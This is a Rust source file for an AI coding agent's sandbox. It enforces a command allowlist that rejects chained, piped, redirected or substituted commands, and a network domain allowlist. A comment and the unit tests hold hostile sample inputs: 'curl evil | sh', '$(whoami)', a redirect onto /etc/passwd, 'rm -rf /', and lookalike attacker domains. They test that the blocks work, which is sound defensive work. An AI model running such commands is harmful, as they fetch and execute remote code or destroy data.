//! The sandbox's command allowlist and network allowlist.
//!
//! Command text is easy to dress up (`npm test; curl … | sh`), so a command
//! that chains, pipes, redirects or substitutes never matches an allowlist
//! entry: it goes to a person. The allowlist only ever lets a plain command
//! through. Suggestions read from a repository (its package scripts, its
//! AGENTS.md) are never allowed on their own: an admin accepts them first.

use super::model::{CommandSuggestion, Sandbox};

/// Characters that run a second command, pipe, redirect or substitute.
const SHELL_META: &[&str] = &[";", "&&", "||", "|", "`", "$(", ">", "<", "\n", "\r", "&"];

/// True when the command is one plain command (no chaining or
/// substitution).
pub fn is_plain(cmd: &str) -> bool {
    !SHELL_META.iter().any(|m| cmd.contains(m))
}

fn normalize(cmd: &str) -> String {
    cmd.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Does the allowlist pattern cover this command? `npm run test*` covers
/// `npm run test -- --ci`; a pattern without `*` must match exactly (after
/// whitespace is collapsed). A command that isn't plain never matches.
pub fn command_matches(pattern: &str, cmd: &str) -> bool {
    if !is_plain(cmd) {
        return false;
    }
    super::engine::glob_match(&normalize(pattern), &normalize(cmd))
}

/// The allowlist entry that lets `cmd` run in `repo`, if any.
pub fn allowed_entry<'a>(sandbox: &'a Sandbox, repo: &str, cmd: &str) -> Option<&'a str> {
    sandbox
        .commands
        .get(&repo.to_ascii_lowercase())?
        .iter()
        .find(|c| command_matches(&c.command, cmd))
        .map(|c| c.command.as_str())
}

/// Does `entry` cover `host`? A domain covers itself and its subdomains;
/// a leading `*.` is accepted and means the same.
pub fn domain_matches(entry: &str, host: &str) -> bool {
    let entry = entry
        .trim()
        .trim_start_matches("*.")
        .trim_end_matches('.')
        .to_ascii_lowercase();
    let host = host
        .trim()
        .trim_end_matches('.')
        .split(':')
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    if entry.is_empty() || host.is_empty() {
        return false;
    }
    host == entry || host.ends_with(&format!(".{entry}"))
}

pub fn domain_allowed(list: &[String], host: &str) -> bool {
    list.iter().any(|e| domain_matches(e, host))
}

/// Hosts CoderHelm's own tooling in the sandbox needs, whatever list a team
/// saved: the Playwright browser downloads its end-to-end runs, page checks
/// and probes start with, GitHub's release downloads (`github.com` sends
/// them there), and the Terraform registry its `terraform init
/// -backend=false` check reads. A team that saved its list before one of
/// these was a default never had it, and its runs then failed on
/// CoderHelm's own setup. The Chrome for Testing build Playwright downloads
/// is redirected to a shared storage host; that one is reached only through
/// the proxy's Playwright mirror (`egress_proxy.py`), never listed.
pub const TOOLING_HOSTS: &[&str] = &[
    "cdn.playwright.dev",
    "playwright.download.prss.microsoft.com",
    "playwright.azureedge.net",
    "release-assets.githubusercontent.com",
    "registry.terraform.io",
];

/// A shared hosting suffix: a template whose placeholder sits right before
/// one of these names every customer of that host, never the team's own.
fn shared_suffix(domain: &str) -> bool {
    let labels = domain.split('.').filter(|l| !l.is_empty()).count();
    labels < 3
}

/// The host of an address a team saved (`https://staging.example.com/x`,
/// `https://pr-{pr}.preview.example.com`): the host itself, or, for a
/// template, the domain its previews live under. `None` when the address
/// has no host, or a template's domain would be a shared host's
/// (`{pr}.vercel.app`): that is every customer's, not the team's.
pub fn own_host_of(address: &str) -> Option<String> {
    let rest = address
        .trim()
        .strip_prefix("https://")
        .or_else(|| address.trim().strip_prefix("http://"))?;
    let host = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("")
        .trim_end_matches('.')
        .to_ascii_lowercase();
    if host.is_empty() {
        return None;
    }
    let domain = match host.rfind('}') {
        None => host,
        Some(i) => {
            let after = &host[i + 1..];
            // The labels after the one holding the placeholder.
            let d = after.split_once('.').map(|(_, d)| d).unwrap_or("");
            if d.is_empty() || shared_suffix(d) {
                return None;
            }
            d.to_string()
        }
    };
    (valid_domain(&domain) && !domain.contains('{')).then_some(domain)
}

/// The team's own hosts the sandbox reaches, from its settings only: the
/// domains an admin listed as the team's own sites (the ones `check_url`
/// reads) and the hosts of the test and preview addresses it saved. Never a
/// host read from code or a ticket.
pub fn own_hosts(web_domains: &[String], addresses: &[String]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let candidates = web_domains
        .iter()
        .map(|d| {
            d.trim()
                .trim_start_matches("*.")
                .trim_end_matches('.')
                .to_ascii_lowercase()
        })
        .filter(|d| valid_domain(d))
        .chain(addresses.iter().filter_map(|a| own_host_of(a)));
    for d in candidates {
        if !domain_allowed(&out, &d) {
            out.push(d);
        }
    }
    out
}

/// The list a run's sandbox builds get when the team limits the network:
/// the team's own list, CoderHelm's tooling hosts ([`TOOLING_HOSTS`]) and
/// the team's own hosts ([`own_hosts`]). Nothing else is added: a limited
/// network stays limited.
pub fn run_allowlist(team: &[String], own: &[String]) -> Vec<String> {
    let mut list: Vec<String> = team
        .iter()
        .map(|d| d.trim().to_string())
        .filter(|d| !d.is_empty())
        .collect();
    let extra = TOOLING_HOSTS
        .iter()
        .map(|h| h.to_string())
        .chain(own.iter().cloned());
    for h in extra {
        if !domain_allowed(&list, &h) {
            list.push(h);
        }
    }
    list
}

/// A plain domain an admin may add (letters, digits, dots, dashes, an
/// optional leading `*.`).
pub fn valid_domain(d: &str) -> bool {
    let d = d.trim().trim_start_matches("*.");
    !d.is_empty()
        && d.len() <= 253
        && d.contains('.')
        && d.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
        && !d.starts_with('.')
        && !d.ends_with('.')
}

/// A command an admin may put on the allowlist: plain, short, printable.
pub fn valid_command(c: &str) -> Result<(), String> {
    let c = c.trim();
    if c.is_empty() || c.len() > 200 {
        return Err("A command must be 1 to 200 characters.".into());
    }
    if !is_plain(c) {
        return Err("Allow one plain command at a time: no ;, &&, |, redirects or $( ).".into());
    }
    if c == "*" {
        return Err("A single * would allow every command. Name the command.".into());
    }
    Ok(())
}

/// Scripts in a package.json worth running in a sandbox: build, test, lint,
/// type checks and formatting checks.
const SCRIPT_WORDS: &[&str] = &[
    "build",
    "test",
    "lint",
    "typecheck",
    "type-check",
    "check",
    "tsc",
    "format",
    "fmt",
    "e2e",
];

/// Suggestions from a package.json's scripts, as `npm run <script>` (or the
/// package manager the lockfile names).
pub fn suggest_from_package_json(text: &str, runner: &str) -> Vec<CommandSuggestion> {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(text) else {
        return Vec::new();
    };
    let Some(scripts) = v.get("scripts").and_then(|s| s.as_object()) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for name in scripts.keys() {
        let lower = name.to_ascii_lowercase();
        let wanted = SCRIPT_WORDS
            .iter()
            .any(|w| lower == *w || lower.starts_with(&format!("{w}:")));
        if wanted
            && name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || ":-_.".contains(c))
        {
            out.push(CommandSuggestion {
                command: format!("{runner} run {name}"),
                origin: "package.json".into(),
            });
        }
    }
    out
}

/// Programs whose commands look like build or test steps.
const RUNNERS: &[&str] = &[
    "npm",
    "pnpm",
    "yarn",
    "npx",
    "bun",
    "cargo",
    "make",
    "go",
    "pytest",
    "python",
    "python3",
    "uv",
    "poetry",
    "tox",
    "./gradlew",
    "gradle",
    "mvn",
    "bundle",
    "rake",
    "dotnet",
    "terraform",
    "tsc",
    "eslint",
    "ruff",
    "mypy",
    "just",
];

/// Suggestions from an AGENTS.md (or CLAUDE.md): commands in code spans or
/// code blocks that start with a known build or test program.
pub fn suggest_from_agents_md(text: &str) -> Vec<CommandSuggestion> {
    let mut candidates: Vec<String> = Vec::new();
    let mut in_block = false;
    for line in text.lines() {
        let t = line.trim();
        if t.starts_with("```") {
            in_block = !in_block;
            continue;
        }
        if in_block {
            candidates.push(t.trim_start_matches("$ ").to_string());
            continue;
        }
        let mut rest = t;
        while let Some(a) = rest.find('`') {
            let after = &rest[a + 1..];
            let Some(b) = after.find('`') else { break };
            candidates.push(after[..b].to_string());
            rest = &after[b + 1..];
        }
    }
    let mut out: Vec<CommandSuggestion> = Vec::new();
    for c in candidates {
        let c = normalize(&c);
        let first = c.split(' ').next().unwrap_or("");
        if RUNNERS.contains(&first)
            && c.contains(' ')
            && valid_command(&c).is_ok()
            && !out.iter().any(|o| o.command == c)
        {
            out.push(CommandSuggestion {
                command: c,
                origin: "AGENTS.md".into(),
            });
        }
    }
    out
}

/// Suggestions not already on the allowlist, without repeats.
pub fn new_suggestions(
    sandbox: &Sandbox,
    repo: &str,
    found: Vec<CommandSuggestion>,
) -> Vec<CommandSuggestion> {
    let repo = repo.to_ascii_lowercase();
    let allowed = sandbox.commands.get(&repo);
    let mut out: Vec<CommandSuggestion> = Vec::new();
    for s in found {
        let on_list = allowed.is_some_and(|l| l.iter().any(|c| c.command == s.command));
        if !on_list && !out.iter().any(|o| o.command == s.command) {
            out.push(s);
        }
    }
    out
}

/// Keeps commands a run met that aren't on the repository's allowlist as
/// suggestions for an admin to accept (never allowed on their own).
/// The allowlist entry to suggest for a command a run met: the command
/// itself, or, when it ends in file names (the test files one change
/// touched), everything before them followed by `*`, so one entry covers
/// every change instead of one per change.
pub fn suggestion_for(cmd: &str) -> String {
    let words: Vec<&str> = cmd.split_whitespace().collect();
    let is_file = |w: &str| {
        !w.starts_with('-')
            && (w.contains('/')
                || [
                    ".ts", ".tsx", ".js", ".jsx", ".mjs", ".cjs", ".py", ".rb", ".go", ".rs",
                    ".java", ".kt", ".php",
                ]
                .iter()
                .any(|e| w.ends_with(e)))
    };
    match words.iter().position(|w| is_file(w)) {
        Some(i) if i >= 2 && words[i..].iter().all(|w| is_file(w)) => {
            format!("{}*", words[..i].join(" "))
        }
        _ => words.join(" "),
    }
}

pub async fn remember(
    store: &dyn super::store::PolicyStore,
    team: &str,
    repo: &str,
    found: Vec<CommandSuggestion>,
) {
    let repo = repo.trim().to_ascii_lowercase();
    if repo.is_empty() || found.is_empty() {
        return;
    }
    for _ in 0..3 {
        let Ok(mut p) = store.load(team).await else {
            return;
        };
        let general: Vec<CommandSuggestion> = found
            .iter()
            .map(|f| CommandSuggestion {
                command: suggestion_for(&f.command),
                origin: f.origin.clone(),
            })
            .collect();
        let mut fresh = new_suggestions(&p.sandbox, &repo, general.clone());
        let existing = p.sandbox.suggestions.entry(repo.clone()).or_default();
        // Earlier one-change suggestions a general entry now covers go.
        let before = existing.len();
        existing.retain(|e| {
            !general
                .iter()
                .any(|g| g.command != e.command && command_matches(&g.command, &e.command))
        });
        let cleaned = existing.len() != before;
        fresh.retain(|f| !existing.iter().any(|e| e.command == f.command));
        if fresh.is_empty() && !cleaned {
            return;
        }
        existing.extend(fresh);
        // Keep the list short enough to read.
        let n = existing.len();
        if n > 30 {
            existing.drain(..n - 30);
        }
        let expect = p.version;
        p.version += 1;
        match store.save(team, &p, expect).await {
            Ok(()) => return,
            Err(super::store::StoreError::Conflict) => continue,
            Err(_) => return,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn own_hosts_come_from_the_teams_settings_and_never_name_a_shared_host() {
        assert_eq!(
            own_host_of("https://staging.example.com/path?x=1").as_deref(),
            Some("staging.example.com")
        );
        assert_eq!(
            own_host_of("https://pr-{pr}.preview-web.example.com").as_deref(),
            Some("preview-web.example.com")
        );
        // A placeholder right before a shared host names every customer.
        assert_eq!(own_host_of("https://{pr}-web.vercel.app"), None);
        assert_eq!(own_host_of("https://{branch}.example.com"), None);
        assert_eq!(own_host_of("ftp://example.com"), None);
        assert_eq!(own_host_of("https://"), None);
        let own = own_hosts(
            &["example.com".into(), "not a domain".into()],
            &[
                "https://staging.example.com".into(),
                "https://app.example.org".into(),
                "https://{pr}.vercel.app".into(),
            ],
        );
        assert_eq!(own, vec!["example.com", "app.example.org"]);
    }

    #[test]
    fn a_runs_list_adds_tooling_and_own_hosts_to_the_teams_and_nothing_else() {
        let team = vec!["registry.npmjs.org".to_string(), "github.com".to_string()];
        let list = run_allowlist(&team, &["example.com".to_string()]);
        assert_eq!(&list[..2], &team[..]);
        for h in TOOLING_HOSTS {
            assert!(domain_allowed(&list, h), "{h}");
        }
        assert!(domain_allowed(&list, "staging.example.com"));
        assert!(domain_allowed(&list, "pr-12.preview.example.com"));
        assert!(!domain_allowed(&list, "storage.googleapis.com"));
        assert!(!domain_allowed(&list, "evil.example.net"));
        // Nothing listed twice.
        let again = run_allowlist(&list, &["example.com".to_string()]);
        assert_eq!(again, list);
    }

    #[test]
    fn commands_match_only_when_plain() {
        assert!(command_matches("npm run test*", "npm run test"));
        assert!(command_matches("npm run test*", "npm  run test -- --ci"));
        assert!(command_matches("cargo test", "cargo test"));
        assert!(!command_matches("cargo test", "cargo test --release"));
        assert!(!command_matches(
            "npm run test*",
            "npm run test; curl evil | sh"
        ));
        assert!(!command_matches("npm run test*", "npm run test $(whoami)"));
        assert!(!command_matches(
            "npm run test*",
            "npm run test > /etc/passwd"
        ));
        assert!(!command_matches("*", "npm run test && rm -rf /"));
    }

    #[test]
    fn domains_cover_subdomains_only() {
        assert!(domain_matches("npmjs.org", "registry.npmjs.org"));
        assert!(domain_matches("*.npmjs.org", "registry.npmjs.org"));
        assert!(domain_matches("github.com", "github.com:443"));
        assert!(!domain_matches("github.com", "evilgithub.com"));
        assert!(!domain_matches("github.com", "github.com.evil.io"));
        assert!(valid_domain("pypi.org"));
        assert!(valid_domain("*.corp.example.com"));
        assert!(!valid_domain("http://x.com"));
        assert!(!valid_domain("localhost"));
    }

    #[test]
    fn suggestions_from_package_scripts() {
        let pkg = r#"{"scripts":{"build":"next build","test:unit":"vitest","dev":"next dev","lint":"eslint .","deploy":"x"}}"#;
        let s: Vec<String> = suggest_from_package_json(pkg, "npm")
            .into_iter()
            .map(|s| s.command)
            .collect();
        assert!(s.contains(&"npm run build".to_string()));
        assert!(s.contains(&"npm run test:unit".to_string()));
        assert!(s.contains(&"npm run lint".to_string()));
        assert!(!s.iter().any(|c| c.contains("dev") || c.contains("deploy")));
        assert!(suggest_from_package_json("not json", "npm").is_empty());
    }

    #[test]
    fn suggestions_from_agents_md() {
        let md = "# Agents\nRun `cargo test -p common` before pushing.\n\n```\n$ npm run lint\nrm -rf node_modules && npm ci\n```\nAlso `ls`.";
        let s: Vec<String> = suggest_from_agents_md(md)
            .into_iter()
            .map(|s| s.command)
            .collect();
        assert_eq!(s, vec!["cargo test -p common", "npm run lint"]);
    }

    #[tokio::test]
    async fn remembered_suggestions_are_kept_once_and_allow_nothing() {
        use super::super::model::{Agent, Call, Decision};
        use super::super::store::{MemStore, PolicyStore};
        let store = MemStore::new();
        let found = vec![CommandSuggestion {
            command: "npm run build".into(),
            origin: "CI workflow".into(),
        }];
        remember(&store, "T", "Acme/Web", found.clone()).await;
        remember(&store, "T", "acme/web", found).await;
        let p = store.load("T").await.unwrap();
        assert_eq!(p.sandbox.suggestions["acme/web"].len(), 1);
        // A suggestion isn't the allowlist: with no command rule it still asks.
        let mut bare = p.clone();
        bare.rules.clear();
        let call = Call::command(Agent::Coder, "npm run build").in_repo(Some("acme/web"));
        assert_eq!(
            super::super::engine::decide(&bare, &call, None, "2026-10-24T00:00:00Z").decision,
            Decision::Ask
        );
    }

    #[test]
    fn a_command_ending_in_test_files_is_suggested_once_for_every_change() {
        assert_eq!(
            suggestion_for("npm test -- --passWithNoTests block-headings.spec.ts heading.test.tsx"),
            "npm test -- --passWithNoTests*"
        );
        assert_eq!(
            suggestion_for("npm test -- --passWithNoTests src/a/b.test.ts"),
            "npm test -- --passWithNoTests*"
        );
        assert_eq!(suggestion_for("npm run lint"), "npm run lint");
        assert_eq!(
            suggestion_for("pytest tests/test_a.py"),
            "pytest tests/test_a.py",
            "too short to generalize"
        );
        assert!(command_matches(
            &suggestion_for("npm test -- --passWithNoTests a.test.ts"),
            "npm test -- --passWithNoTests x.spec.ts y.test.tsx"
        ));
    }

    #[test]
    fn suggestions_skip_what_is_already_allowed() {
        let mut sb = Sandbox::default();
        sb.commands.insert(
            "acme/web".into(),
            vec![super::super::model::AllowedCommand {
                command: "npm run lint".into(),
                added_by: String::new(),
                origin: String::new(),
            }],
        );
        let found = suggest_from_agents_md("`npm run lint` and `npm run test` and `npm run test`");
        let s = new_suggestions(&sb, "Acme/Web", found);
        assert_eq!(s.len(), 1);
        assert_eq!(s[0].command, "npm run test");
    }
}
